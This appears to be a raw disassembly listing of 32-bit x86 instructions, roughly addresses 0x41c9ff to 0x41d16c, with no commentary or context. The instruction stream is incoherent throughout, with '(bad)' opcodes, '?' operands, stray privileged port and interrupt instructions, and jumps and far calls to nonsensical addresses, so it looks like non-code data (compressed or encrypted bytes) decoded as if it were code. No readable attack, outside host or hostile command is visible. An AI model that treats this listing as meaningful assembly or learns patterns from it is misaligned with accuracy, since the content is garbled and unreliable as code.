  41c9ff:	xor    ecx,edx
  41ca01:	sbb    eax,0xb63bcacc
  41ca06:	iret   
  41ca07:	std    
  41ca08:	cli    
  41ca09:	or     edx,DWORD PTR [edx+0x51b92a86]
  41ca0f:	fcmovbe st,st(1)
  41ca11:	pop    eax
  41ca12:	aad    0x41
  41ca14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca15:	ins    DWORD PTR es:[edi],dx
  41ca16:	push   0x5a
  41ca18:	lahf   
  41ca19:	test   BYTE PTR [edx-0x4b],cl
  41ca1c:	mov    ebp,0xcc824871
  41ca21:	fwait
  41ca22:	gs push ss
  41ca24:	or     ebx,DWORD PTR [ebp+0x1c50138d]
  41ca2a:	fst    QWORD PTR [edi-0x64]
  41ca2d:	fnstenv ds:0xb4306fe3
  41ca33:	mov    ah,dl
  41ca35:	mov    DWORD PTR [ebx-0x2dbe94e2],0x68cfc2ce
  41ca3f:	ret    0x5c4b
  41ca42:	sub    BYTE PTR [eax+0xf35a53d],al
  41ca48:	add    al,0xb8
  41ca4a:	pop    esp
  41ca4b:	cmp    esi,DWORD PTR [esi+0x3c]
  41ca4e:	add    eax,0xbc77e850
  41ca53:	sbb    cl,BYTE PTR [ebp-0x51e2cb35]
  41ca59:	mov    dh,BYTE PTR [edi-0x31e2762f]
  41ca5f:	xor    eax,0x3e7355f2
  41ca64:	pop    ss
  41ca65:	inc    ecx
  41ca66:	or     BYTE PTR [ebx+ecx*8-0x16],al
  41ca6a:	sbb    DWORD PTR [ebx+0x5e],edx
  41ca6d:	out    dx,eax
  41ca6e:	mov    bl,0xeb
  41ca70:	les    esp,FWORD PTR [esi-0x581d0082]
  41ca76:	mov    DWORD PTR [edi+0xc],edx
  41ca79:	dec    esi
  41ca7a:	sub    BYTE PTR ds:0xacf837cb,dl
  41ca80:	sbb    eax,0x1c8fe291
  41ca85:	push   ebx
  41ca86:	pop    edx
  41ca87:	mov    edi,0xc329ad77
  41ca8c:	xor    DWORD PTR [eax+eiz*8-0x68bb2984],esp
  41ca93:	frstor [ecx+0x20202019]
  41ca99:	xlat   BYTE PTR ds:[ebx]
  41ca9a:	jno    0x41ca23
  41ca9c:	jae    0x41caf4
  41ca9e:	repnz add eax,0x8387a8bb
  41caa4:	mov    ?,WORD PTR fs:[ebx+esi*8]
  41caa8:	sti    
  41caa9:	(bad)  
  41caaa:	stc    
  41caab:	pushf  
  41caac:	dec    edi
  41caad:	xor    DWORD PTR [edx-0x39],edi
  41cab0:	inc    ecx
  41cab1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cab2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cab3:	ins    DWORD PTR es:[edi],dx
  41cab4:	mov    ds:0x5ec34d3,al
  41cab9:	pop    ss
  41caba:	add    al,0xe5
  41cabc:	lods   eax,DWORD PTR ds:[esi]
  41cabd:	les    edi,FWORD PTR [edx-0x4c157772]
  41cac3:	jge    0x41cb0a
  41cac5:	nop
  41cac6:	sub    ecx,ebp
  41cac8:	inc    esi
  41cac9:	pop    ecx
  41caca:	inc    ebx
  41cacb:	push   ds
  41cacc:	leave  
  41cacd:	jp     0x41ca87
  41cacf:	jle    0x41cacf
  41cad1:	test   DWORD PTR [ecx],edx
  41cad3:	jp     0x41cb09
  41cad5:	lods   al,BYTE PTR ds:[esi]
  41cad6:	test   ebp,ecx
  41cad8:	repnz adc DWORD PTR [ebx-0x36950c5d],edx
  41cadf:	data16 sub ah,BYTE PTR [edi-0x3e]
  41cae3:	pop    eax
  41cae4:	jcxz   0x41ca9e
  41cae7:	fadd   QWORD PTR [ecx-0x3fd62bd7]
  41caed:	sub    ebx,DWORD PTR [ebp-0x2b6138ab]
  41caf3:	leave  
  41caf4:	push   ecx
  41caf5:	sar    DWORD PTR ds:0xf15513ac,0x27
  41cafc:	mov    WORD PTR [esi+0x42],ds
  41caff:	xlat   BYTE PTR ds:[ebx]
  41cb00:	lods   eax,DWORD PTR ds:[esi]
  41cb01:	xor    al,0xef
  41cb03:	pop    ecx
  41cb04:	add    BYTE PTR [ecx+0xd],ch
  41cb07:	xchg   ebx,eax
  41cb08:	stc    
  41cb09:	enter  0x8075,0x8e
  41cb0d:	fwait
  41cb0e:	sbb    esi,DWORD PTR [ebp-0xc7c0e64]
  41cb14:	adc    ah,BYTE PTR [esi-0x28]
  41cb17:	mov    eax,ds:0xa21f103d
  41cb1c:	dec    eax
  41cb1d:	pushf  
  41cb1e:	xchg   edi,eax
  41cb1f:	out    0x5c,eax
  41cb21:	sahf   
  41cb22:	cli    
  41cb23:	or     cl,BYTE PTR [esi+0x6d]
  41cb26:	loope  0x41caef
  41cb28:	arpl   WORD PTR [esi+ebx*4],bp
  41cb2b:	ror    bl,0x79
  41cb2e:	push   ss
  41cb2f:	loop   0x41cb94
  41cb31:	aam    0x8c
  41cb33:	inc    edx
  41cb34:	arpl   sp,sp
  41cb36:	xor    esp,ebx
  41cb38:	xchg   ecx,eax
  41cb39:	and    eax,0x71a78f40
  41cb3e:	ss ret 0x1fa
  41cb42:	adc    BYTE PTR [eax+0x4c3f80f6],ah
  41cb48:	aam    0xe3
  41cb4a:	pop    edx
  41cb4b:	push   0x49cc9fa6
  41cb50:	xchg   DWORD PTR [eax-0x2d],esi
  41cb53:	xor    ah,BYTE PTR [edi]
  41cb55:	dec    ebx
  41cb56:	popa   
  41cb57:	stos   DWORD PTR es:[edi],eax
  41cb58:	inc    esi
  41cb59:	imul   ebp,DWORD PTR [edx],0xffffffe4
  41cb5c:	jb     0x41cbba
  41cb5e:	xchg   esp,eax
  41cb5f:	xchg   edx,eax
  41cb60:	add    eax,DWORD PTR [ebx-0x7816d449]
  41cb66:	push   0xe975fde7
  41cb6b:	dec    ebx
  41cb6c:	jle    0x41cb46
  41cb6e:	jnp    0x41cb81
  41cb70:	mov    cl,0x81
  41cb72:	mov    ecx,0xff6d99a7
  41cb77:	xlat   BYTE PTR ds:[ebx]
  41cb78:	dec    ebp
  41cb79:	ret    0x47d7
  41cb7c:	ins    DWORD PTR es:[edi],dx
  41cb7d:	mov    esp,0xb89b9da5
  41cb82:	sbb    BYTE PTR [edi-0x4b],ah
  41cb85:	fs dec ecx
  41cb87:	fadd   DWORD PTR [edi+0x61]
  41cb8a:	cmp    al,0xcf
  41cb8c:	int3   
  41cb8d:	add    al,0xd6
  41cb8f:	mov    edi,0xfa3d1fde
  41cb94:	or     BYTE PTR [edx+0x33],0x7
  41cb98:	pushf  
  41cb99:	jle    0x41cb62
  41cb9b:	loope  0x41cbfa
  41cb9d:	mov    al,ds:0x59f26b25
  41cba2:	popf   
  41cba3:	jg     0x41cb6a
  41cba5:	and    al,0xd3
  41cba7:	push   ds
  41cba8:	mov    cl,0xd1
  41cbaa:	adc    BYTE PTR [ecx-0x59],bl
  41cbad:	pop    edi
  41cbae:	adc    al,ah
  41cbb0:	sub    DWORD PTR [eax+ebp*4-0x3767796c],edx
  41cbb7:	(bad)  
  41cbb9:	jmp    0x5bdc14ea
  41cbbe:	pusha  
  41cbbf:	sub    DWORD PTR [esi],esp
  41cbc1:	rol    DWORD PTR [edx],0x44
  41cbc4:	(bad)  
  41cbc6:	dec    edx
  41cbc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbc8:	popa   
  41cbc9:	xchg   ebx,eax
  41cbca:	call   DWORD PTR [eax]
  41cbcc:	pusha  
  41cbcd:	mov    esi,0x30cfedf9
  41cbd2:	mov    ah,0xaf
  41cbd4:	adc    BYTE PTR [ebx],ch
  41cbd6:	pop    ss
  41cbd7:	fwait
  41cbd8:	mov    BYTE PTR [edi+0x401a7d21],bh
  41cbde:	jle    0x41cc40
  41cbe0:	(bad)  
  41cbe1:	stc    
  41cbe2:	xor    BYTE PTR [edx],al
  41cbe4:	push   es
  41cbe5:	outs   dx,DWORD PTR ds:[esi]
  41cbe6:	lods   eax,DWORD PTR ds:[esi]
  41cbe7:	in     al,dx
  41cbe8:	shl    bl,cl
  41cbea:	ds or  esi,esi
  41cbed:	push   cs
  41cbee:	mov    dl,0x75
  41cbf0:	jl     0x41cc09
  41cbf2:	inc    edi
  41cbf4:	adc    ah,ah
  41cbf6:	or     bh,cl
  41cbf8:	lods   eax,DWORD PTR ds:[esi]
  41cbf9:	aaa    
  41cbfa:	sub    eax,0x6b6ebdf3
  41cbff:	scas   al,BYTE PTR es:[edi]
  41cc00:	lds    esi,FWORD PTR [edi]
  41cc02:	inc    edx
  41cc03:	clc    
  41cc04:	xchg   BYTE PTR [ebx+edx*1-0x75402b88],ch
  41cc0b:	sbb    eax,DWORD PTR [ecx+0x5c]
  41cc0e:	idiv   BYTE PTR [eax-0x6fd2dde]
  41cc14:	xor    eax,0xf69b0cf1
  41cc19:	test   DWORD PTR [eax+0x2f],esi
  41cc1c:	pop    esp
  41cc1d:	add    DWORD PTR [eax+eax*2+0x2],esp
  41cc21:	enter  0xc7eb,0x26
  41cc25:	outs   dx,BYTE PTR ds:[esi]
  41cc26:	ret    0x8519
  41cc29:	push   eax
  41cc2a:	fs and esi,esp
  41cc2d:	loopne 0x41cc8c
  41cc2f:	mov    ds:0x42be2bf3,al
  41cc34:	dec    ebp
  41cc35:	sti    
  41cc36:	sbb    eax,0x7fa37337
  41cc3b:	cmp    BYTE PTR [esi+esi*8-0x48],0x1
  41cc40:	push   0x58
  41cc42:	ret    
  41cc43:	pop    esi
  41cc44:	fnstenv [esi+0x1cebbec6]
  41cc4a:	push   ebx
  41cc4b:	call   0x8419:0x43124167
  41cc52:	mov    ecx,0x43d6bb02
  41cc57:	out    dx,eax
  41cc58:	mov    edx,ecx
  41cc5a:	xchg   DWORD PTR [ebx+0x21],edx
  41cc5d:	xor    esp,eax
  41cc5f:	gs jl  0x41cc7d
  41cc62:	mov    ebx,0xf9b07168
  41cc67:	imul   ecx,DWORD PTR [eax+0x4a],0xecbf9f05
  41cc6e:	jne    0x41cc4d
  41cc70:	push   eax
  41cc71:	loop   0x41ccdb
  41cc73:	and    eax,ecx
  41cc75:	xor    eax,0x2897e25c
  41cc7a:	ret    
  41cc7b:	test   al,0x3b
  41cc7d:	add    al,0xaa
  41cc7f:	test   DWORD PTR [esi+0x7a4da22f],edi
  41cc85:	repz jmp 0xa716:0x2f7c5e52
  41cc8d:	dec    edi
  41cc8e:	cdq    
  41cc8f:	rcr    BYTE PTR [esp+ebx*2-0x6ca20ed],1
  41cc96:	(bad)  [edi+eiz*4]
  41cc99:	in     al,dx
  41cc9a:	sub    ch,BYTE PTR [edi-0x7]
  41cc9d:	mov    al,0xd3
  41cc9f:	int    0x56
  41cca1:	mov    dl,BYTE PTR [ecx+0x624d212d]
  41cca7:	inc    eax
  41cca8:	jns    0x41cd26
  41ccaa:	sub    BYTE PTR [edi],dl
  41ccac:	and    BYTE PTR [edi-0xa],al
  41ccaf:	mov    eax,0x9f74470a
  41ccb4:	jge    0x41ccbf
  41ccb6:	in     eax,0x2d
  41ccb8:	add    eax,0xf6cfd93e
  41ccbd:	inc    edi
  41ccbe:	jle    0x41cd0c
  41ccc0:	sti    
  41ccc1:	xchg   DWORD PTR [bx+di+0x5],ebp
  41ccc5:	int3   
  41ccc6:	adc    edi,0x4d
  41ccc9:	mov    ah,0x7
  41cccb:	sub    eax,0xf367cbc4
  41ccd0:	add    eax,DWORD PTR [edi]
  41ccd2:	stos   BYTE PTR es:[edi],al
  41ccd3:	add    BYTE PTR [edx],al
  41ccd5:	mov    ah,0xce
  41ccd7:	stos   DWORD PTR es:[edi],eax
  41ccd8:	scas   eax,DWORD PTR es:[edi]
  41ccd9:	mov    edi,ebp
  41ccdb:	or     al,0xbf
  41ccdd:	data16 mov dh,0xc3
  41cce0:	adc    DWORD PTR [edi-0x14],ebp
  41cce3:	pop    edi
  41cce5:	(bad)  
  41cce7:	mov    eax,0xde993a24
  41ccec:	adc    al,0xe6
  41ccee:	sbb    edi,DWORD PTR [edx+0x76]
  41ccf1:	data16 (bad) [edx]
  41ccf4:	dec    eax
  41ccf5:	aas    
  41ccf6:	push   cs
  41ccf7:	add    eax,0x1918d3fc
  41ccfc:	lds    eax,FWORD PTR [ebp+0x50]
  41ccff:	jno    0x41cd42
  41cd01:	addr16 push ds
  41cd03:	leave  
  41cd04:	mov    ds:0xb6c1e358,eax
  41cd09:	add    eax,0x9387b9c1
  41cd0e:	sti    
  41cd0f:	es push es
  41cd11:	add    dl,BYTE PTR [esi-0x7d67d6c4]
  41cd17:	test   BYTE PTR [ebx+0x482f9a67],dl
  41cd1d:	sar    DWORD PTR [edx+0x446c5d3f],0x7
  41cd24:	sbb    ebp,edx
  41cd26:	jo     0x41cd29
  41cd28:	and    dl,ch
  41cd2a:	repnz shl DWORD PTR [eax+0xe97e4b5],1
  41cd31:	mov    DWORD PTR [esi],ebp
  41cd33:	mov    edi,0x3c22ff1e
  41cd38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd39:	mov    esp,edi
  41cd3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd3d:	shr    DWORD PTR [edx],cl
  41cd3f:	dec    ebp
  41cd40:	clc    
  41cd41:	dec    esp
  41cd42:	popf   
  41cd43:	pushaw 
  41cd45:	(bad)  
  41cd46:	fld    DWORD PTR [eax-0x68]
  41cd49:	rcl    DWORD PTR [esi+esi*2-0x79],0x69
  41cd4e:	or     esi,DWORD PTR [esi]
  41cd50:	xlat   BYTE PTR ds:[ebx]
  41cd51:	or     eax,0x4023595d
  41cd56:	pop    eax
  41cd57:	loop   0x41cdcb
  41cd59:	sub    al,bl
  41cd5b:	jbe    0x41cd86
  41cd5d:	push   eax
  41cd5e:	jns    0x41cd5e
  41cd60:	mov    ds:0xfddb703e,al
  41cd65:	aam    0x9b
  41cd67:	pusha  
  41cd68:	fsubr  QWORD PTR ds:0x5c47107c
  41cd6e:	jl     0x41cd12
  41cd70:	xor    al,0x99
  41cd72:	push   cs
  41cd73:	pop    ebx
  41cd74:	xchg   BYTE PTR [eax+0x65ff77af],dh
  41cd7a:	pop    ecx
  41cd7b:	pop    ebx
  41cd7c:	jmp    0x41cdce
  41cd7e:	daa    
  41cd7f:	pop    es
  41cd80:	mov    ds:0x9d42498c,al
  41cd85:	aad    0x4a
  41cd87:	in     eax,0xd5
  41cd89:	lock aam 0x36
  41cd8c:	pop    es
  41cd8d:	mov    ebp,DWORD PTR [esp+edx*1]
  41cd90:	mov    bl,0x58
  41cd92:	cmp    BYTE PTR [ebx],dl
  41cd94:	(bad)  
  41cd95:	fnstenv ds:0xe6171d1c
  41cd9b:	or     edx,esp
  41cd9d:	out    dx,al
  41cd9e:	sbb    edi,DWORD PTR [ecx-0x375dd19a]
  41cda4:	fistp  DWORD PTR [edi-0x31]
  41cda7:	stos   DWORD PTR es:[edi],eax
  41cda8:	fwait
  41cda9:	push   eax
  41cdaa:	sbb    eax,0xf166c57a
  41cdaf:	or     BYTE PTR [ebx],0x5f
  41cdb2:	aas    
  41cdb3:	js     0x41ce20
  41cdb5:	jmp    0x61fd:0xa9c7435
  41cdbc:	push   ebp
  41cdbd:	test   al,0xdb
  41cdbf:	mov    ds:0xfb8bbeb4,eax
  41cdc4:	mov    ebx,0x5afb6839
  41cdc9:	sub    eax,0x4b313abe
  41cdce:	pop    esp
  41cdcf:	cmp    al,0xe4
  41cdd1:	xchg   ebp,eax
  41cdd2:	retf   0x1bb3
  41cdd5:	repz cmp BYTE PTR [esi],0x79
  41cdd9:	pop    ebp
  41cdda:	pop    esi
  41cddb:	in     al,0x20
  41cddd:	rcl    ah,0xd3
  41cde0:	cmp    al,0x4a
  41cde2:	pop    es
  41cde3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cde4:	xchg   ebp,eax
  41cde5:	sti    
  41cde6:	mov    bh,BYTE PTR [edx+0x29]
  41cde9:	pop    edi
  41cdea:	xlat   BYTE PTR ds:[ebx]
  41cdeb:	mov    ebx,0xd1c38498
  41cdf0:	sbb    eax,0xff43748f
  41cdf5:	xchg   ecx,eax
  41cdf6:	dec    ecx
  41cdf7:	xor    eax,DWORD PTR [edi+eiz*8+0x61]
  41cdfb:	xlat   BYTE PTR fs:[ebx]
  41cdfd:	ret    0x91e4
  41ce00:	inc    esp
  41ce01:	cdq    
  41ce02:	mov    cl,0xab
  41ce04:	cmp    BYTE PTR [edx+0x13],cl
  41ce07:	shl    BYTE PTR [eax+0x75],0x82
  41ce0b:	imul   ebx,edi,0xd589bb5
  41ce11:	jmp    0xd7942d35
  41ce16:	mov    ds,eax
  41ce18:	mov    eax,0xf5c888ac
  41ce1d:	sub    al,0x5a
  41ce1f:	jne    0x41ce6f
  41ce21:	popf   
  41ce22:	push   esi
  41ce23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce24:	scas   al,BYTE PTR es:[edi]
  41ce25:	xchg   BYTE PTR [edx+ebx*2+0x54],dh
  41ce29:	or     BYTE PTR [ebp+edx*2-0x2c],0x59
  41ce2e:	add    DWORD PTR [edi-0x15da7c6f],edi
  41ce34:	mov    edx,0xaadf7819
  41ce39:	jp     0x41ce47
  41ce3b:	xchg   edi,eax
  41ce3c:	mov    es,WORD PTR [eax-0x79]
  41ce3f:	je     0x41cdcc
  41ce41:	loope  0x41cebe
  41ce43:	dec    eax
  41ce44:	(bad)  
  41ce45:	retf   0x4872
  41ce48:	call   0xf2d3:0x77c61396
  41ce4f:	add    esp,eax
  41ce51:	jmp    0x41cdfd
  41ce53:	xor    DWORD PTR [ebx],esi
  41ce55:	cli    
  41ce56:	neg    BYTE PTR [eax-0x7135a4b1]
  41ce5c:	cld    
  41ce5d:	rol    BYTE PTR [edx+0x60a66d87],1
  41ce63:	or     BYTE PTR [eax+edx*1],bl
  41ce66:	das    
  41ce67:	addr16 (bad) 
  41ce69:	and    BYTE PTR [ecx+0x29],bl
  41ce6c:	mov    ds,WORD PTR [edi+0x4c]
  41ce6f:	loope  0x41ce4f
  41ce71:	int    0x50
  41ce73:	push   es
  41ce74:	bound  esp,QWORD PTR [eax]
  41ce76:	xchg   BYTE PTR [ebx+0x1fce0b4e],al
  41ce7c:	sbb    DWORD PTR [ecx+edi*2],esp
  41ce7f:	lods   eax,DWORD PTR ds:[esi]
  41ce80:	pop    ecx
  41ce81:	cmp    ch,BYTE PTR [ebp-0x23]
  41ce84:	dec    ecx
  41ce85:	imul   edi,DWORD PTR [ebp+0xc],0x1627e0a0
  41ce8c:	add    ecx,DWORD PTR [edi+0x26]
  41ce8f:	cmc    
  41ce90:	dec    ecx
  41ce91:	or     BYTE PTR [ebp-0xc426d7e],dl
  41ce97:	out    0xc0,eax
  41ce99:	lock sbb ebx,DWORD PTR [edi]
  41ce9c:	dec    esi
  41ce9d:	(bad)  
  41ce9e:	sti    
  41ce9f:	jmp    DWORD PTR [edi+0x47]
  41cea2:	cli    
  41cea3:	xor    al,0x57
  41cea5:	pop    eax
  41cea6:	scas   al,BYTE PTR es:[edi]
  41cea7:	jns    0x41ce4c
  41cea9:	push   esi
  41ceaa:	ja     0x41cef8
  41ceac:	mov    esp,0x5210cee4
  41ceb1:	sub    BYTE PTR [eax],bl
  41ceb3:	and    DWORD PTR [esi-0x3f07151],esp
  41ceb9:	fnstsw WORD PTR [edi+edi*1]
  41cebc:	xor    ebx,ebx
  41cebe:	es mov al,0x70
  41cec1:	mov    edi,0x52cdc550
  41cec6:	mov    edi,0xe55a4c4b
  41cecb:	sub    ecx,DWORD PTR [edi-0x2f4dbf18]
  41ced1:	xchg   esp,eax
  41ced2:	es js  0x41ced9
  41ced5:	mov    esi,edx
  41ced7:	push   ebp
  41ced8:	fwait
  41ced9:	dec    edi
  41ceda:	sbb    BYTE PTR [edi-0xfbd52cd],bl
  41cee0:	push   esi
  41cee1:	pop    edi
  41cee2:	jl     0x41ce93
  41cee4:	hlt    
  41cee5:	test   ah,dh
  41cee7:	dec    ebp
  41cee8:	(bad)  
  41cee9:	(bad)  
  41ceea:	retf   
  41ceeb:	cmp    ch,ch
  41ceed:	dec    esi
  41ceee:	jg     0x41ce70
  41cef0:	push   0x2a
  41cef2:	mov    cl,0x8
  41cef4:	pop    ecx
  41cef5:	xchg   ecx,eax
  41cef6:	shr    BYTE PTR [edi-0x5a3721c1],cl
  41cefc:	lods   al,BYTE PTR ds:[esi]
  41cefd:	inc    ecx
  41cefe:	cmp    al,0x6d
  41cf00:	icebp  
  41cf01:	neg    DWORD PTR [ecx-0x50]
  41cf04:	sbb    eax,0xf0476e5f
  41cf09:	inc    esp
  41cf0a:	mov    esi,0xbef811e8
  41cf0f:	aam    0x6
  41cf11:	or     DWORD PTR [edi+0x64],esp
  41cf14:	jne    0x41cf90
  41cf16:	ja     0x41cebb
  41cf18:	ss scas al,BYTE PTR es:[edi]
  41cf1a:	jnp    0x41ceca
  41cf1c:	add    esp,DWORD PTR [edi]
  41cf1e:	mov    ds,ebp
  41cf20:	leave  
  41cf21:	pusha  
  41cf22:	(bad)  
  41cf24:	dec    ebp
  41cf25:	pop    esi
  41cf26:	jo     0x41cf94
  41cf28:	outs   dx,BYTE PTR ds:[esi]
  41cf29:	sbb    ebx,DWORD PTR [ecx+0x47]
  41cf2c:	push   ebp
  41cf2d:	mov    ebp,0x1584a5d8
  41cf32:	sub    BYTE PTR [edi+0x54e691fe],ch
  41cf38:	cwde   
  41cf39:	push   0x14
  41cf3b:	(bad)  
  41cf3c:	xor    BYTE PTR [eax-0x58ed4f59],dl
  41cf42:	mov    esi,0xfbe71e92
  41cf47:	mov    ds:0x58dddc59,al
  41cf4c:	popa   
  41cf4d:	call   DWORD PTR ds:0xa9b7116d
  41cf53:	mov    al,ds:0x970a2ae8
  41cf58:	aam    0xb3
  41cf5a:	iret   
  41cf5b:	and    edi,esi
  41cf5d:	mov    ebp,DWORD PTR ds:0xd2674970
  41cf63:	cmp    DWORD PTR [bx+0x60],esp
  41cf67:	dec    ebp
  41cf68:	in     eax,0x77
  41cf6a:	repz sbb dl,BYTE PTR [ecx]
  41cf6d:	ret    
  41cf6e:	and    BYTE PTR [ecx+0x69648210],cl
  41cf74:	and    eax,DWORD PTR [ecx+0x4b]
  41cf77:	in     al,0x6b
  41cf79:	pushf  
  41cf7a:	ret    
  41cf7b:	(bad)  
  41cf7c:	out    dx,eax
  41cf7d:	dec    esp
  41cf7e:	cmp    al,0xd0
  41cf80:	inc    esi
  41cf81:	data16 out dx,al
  41cf83:	in     eax,dx
  41cf84:	cmp    BYTE PTR [edx+eiz*1-0x6b],bl
  41cf88:	ins    DWORD PTR es:[edi],dx
  41cf89:	sbb    eax,0x6b513dd8
  41cf8e:	(bad)  
  41cf8f:	adc    edx,DWORD PTR [eax-0x5d]
  41cf92:	mov    esi,0x39bfa0ca
  41cf97:	jl     0x41cf1b
  41cf99:	mov    esp,0x4127dac8
  41cf9e:	mov    ds:0x1c156af5,eax
  41cfa3:	fst    DWORD PTR [ebx+eiz*2-0x23139f3f]
  41cfaa:	inc    ebp
  41cfab:	into   
  41cfac:	and    BYTE PTR ds:0x3bdec772,bh
  41cfb2:	fldl2e 
  41cfb4:	or     al,0x9d
  41cfb6:	pop    esi
  41cfb7:	sbb    DWORD PTR [edx-0x65],esp
  41cfba:	in     eax,0x27
  41cfbc:	iret   
  41cfbd:	dec    ecx
  41cfbe:	mov    al,BYTE PTR [esi-0x69]
  41cfc1:	adc    bl,BYTE PTR [esi+ecx*4+0x794c84dd]
  41cfc8:	pop    eax
  41cfc9:	daa    
  41cfca:	push   ebp
  41cfcb:	and    edi,ebx
  41cfcd:	mov    al,ds:0x74c59449
  41cfd2:	sub    BYTE PTR [eax-0x6b],ah
  41cfd5:	add    esi,eax
  41cfd7:	pop    ss
  41cfd8:	out    0x5a,al
  41cfda:	jne    0x41cf80
  41cfdc:	jmp    0x8c9ecbca
  41cfe1:	in     eax,0xc4
  41cfe3:	mov    edx,0xfcc37613
  41cfe8:	mov    di,0xcf0f
  41cfec:	jno    0x41d065
  41cfee:	test   BYTE PTR [edx+0x5c],cl
  41cff1:	fnstenv [ebx+ebx*8+0x3d84c8d9]
  41cff8:	test   eax,0xa0b8c4bc
  41cffd:	inc    esp
  41cffe:	fimul  WORD PTR [esi-0x7c6bbb28]
  41d004:	or     al,0x81
  41d006:	call   DWORD PTR [eax-0x259330d9]
  41d00c:	add    DWORD PTR [edx+edi*1-0xe],edi
  41d010:	dec    edi
  41d011:	int3   
  41d012:	push   ebp
  41d013:	call   0x14eced15
  41d018:	adc    ah,BYTE PTR [edi+edi*4+0x7b]
  41d01c:	sub    ah,BYTE PTR [edx-0x3efacc72]
  41d022:	jmp    0x96697651
  41d027:	inc    ebx
  41d028:	lea    eax,[eax]
  41d02a:	push   edx
  41d02b:	mov    ecx,?
  41d02d:	shl    DWORD PTR [esp+esi*2-0x57],1
  41d031:	mov    edi,ecx
  41d033:	adc    eax,0x4f08114e
  41d038:	pop    ebp
  41d039:	and    eax,0x3c81a666
  41d03e:	leave  
  41d03f:	fs sub edx,esi
  41d042:	xchg   edx,eax
  41d043:	mov    eax,ds:0xff3fac7d
  41d048:	and    eax,0xfa565c7
  41d04d:	pop    esp
  41d04e:	in     al,dx
  41d04f:	inc    edi
  41d050:	fwait
  41d051:	popa   
  41d052:	dec    ax
  41d054:	dec    ecx
  41d055:	mov    ds:0xf45dc1e2,eax
  41d05a:	mov    cl,cl
  41d05c:	inc    esp
  41d05d:	call   0x707:0x764dc482
  41d064:	cmp    BYTE PTR [esi+0xc],cl
  41d067:	call   0x4617:0x5ca91c7c
  41d06e:	addr16 jp 0x41d093
  41d071:	daa    
  41d072:	cmp    BYTE PTR [edi-0x5e43136a],cl
  41d078:	mov    bh,0xaa
  41d07a:	dec    ecx
  41d07b:	sti    
  41d07c:	add    BYTE PTR [ecx],dh
  41d07e:	mov    ch,0xa2
  41d080:	mov    ebx,0x2696d13
  41d085:	into   
  41d086:	adc    edx,ecx
  41d088:	test   eax,0xa41add5a
  41d08d:	rol    DWORD PTR [ebx+ebx*4-0x6b],cl
  41d091:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d092:	in     al,0xbc
  41d094:	(bad)  
  41d096:	icebp  
  41d097:	push   eax
  41d098:	aaa    
  41d099:	(bad)  
  41d09b:	dec    edi
  41d09c:	xchg   edi,eax
  41d09d:	es mov edx,0xb8af473b
  41d0a3:	dec    ecx
  41d0a4:	xor    al,0xe3
  41d0a6:	or     al,0xc0
  41d0a8:	adc    eax,0x12e1185c
  41d0ad:	inc    ecx
  41d0ae:	js     0x41d0a6
  41d0b0:	lods   eax,DWORD PTR ds:[esi]
  41d0b1:	dec    esp
  41d0b2:	ja     0x41d098
  41d0b4:	lods   eax,DWORD PTR ds:[esi]
  41d0b5:	call   FWORD PTR [ecx]
  41d0b7:	sub    edx,edx
  41d0b9:	arpl   WORD PTR [ebx+0x16],ax
  41d0bc:	ins    DWORD PTR es:[edi],dx
  41d0bd:	stc    
  41d0be:	mov    eax,ds:0xee780b19
  41d0c3:	sbb    ah,bl
  41d0c5:	lds    esi,FWORD PTR [esi+0x7]
  41d0c8:	addr16 dec edi
  41d0ca:	mov    cl,0x86
  41d0cc:	ja     0x41d0d5
  41d0ce:	add    BYTE PTR [ecx],ch
  41d0d0:	dec    ebx
  41d0d1:	jmp    0x3910:0x721b9142
  41d0d8:	rcl    dh,0x29
  41d0db:	dec    eax
  41d0dc:	fldcw  WORD PTR [ecx+ecx*2-0x5fd0659]
  41d0e3:	loope  0x41d066
  41d0e5:	imul   edi,DWORD PTR [edx+0x16],0xe0b3ef17
  41d0ec:	xchg   esi,eax
  41d0ed:	imul   edx,DWORD PTR [ebx+edx*1-0x2b7780af],0x17
  41d0f5:	retf   0x4b5d
  41d0f8:	mov    al,ds:0xff270fd3
  41d0fd:	xchg   ecx,eax
  41d0fe:	mov    BYTE PTR [eax-0x7a03e900],ch
  41d104:	add    bl,BYTE PTR [esi-0x70]
  41d107:	(bad)  
  41d108:	popf   
  41d109:	in     eax,dx
  41d10a:	(bad)  
  41d10b:	xor    edi,0xdf55a218
  41d111:	cmc    
  41d112:	cmp    dl,BYTE PTR [ebx-0x32a3556c]
  41d118:	dec    esp
  41d119:	jb     0x41d18b
  41d11b:	xchg   edi,eax
  41d11c:	out    0xb9,eax
  41d11e:	sti    
  41d11f:	jmp    0x149:0xf8be80dc
  41d126:	cmp    BYTE PTR [edx+0x6e],bh
  41d129:	dec    eax
  41d12a:	(bad)  
  41d12b:	in     eax,dx
  41d12c:	leave  
  41d12d:	push   ebx
  41d12e:	sbb    eax,0xc4395975
  41d133:	mov    esp,0xdf881696
  41d138:	in     al,0x8b
  41d13a:	lea    ebx,[esi+0x3b]
  41d13d:	(bad)  
  41d13e:	in     eax,0x2d
  41d140:	popa   
  41d141:	inc    edx
  41d142:	stc    
  41d143:	cs (bad) 
  41d146:	mov    edi,esi
  41d148:	mov    dl,0x32
  41d14a:	stos   BYTE PTR es:[edi],al
  41d14b:	inc    esi
  41d14c:	out    dx,eax
  41d14d:	pushf  
  41d14e:	jl     0x41d110
  41d150:	bound  ecx,QWORD PTR [edx]
  41d152:	in     eax,0xe7
  41d154:	cmp    ebp,0xd
  41d157:	pop    ebp
  41d158:	inc    ebp
  41d159:	iret   
  41d15a:	mov    DWORD PTR [edx],edi
  41d15c:	add    al,BYTE PTR cs:[edi]
  41d15f:	or     bh,BYTE PTR [ebx]
  41d161:	add    al,0x9
  41d163:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d164:	sbb    BYTE PTR [edx+0x39],ch
  41d167:	adc    eax,0x79dad0d2
  41d16c:	js     0x41d1ad
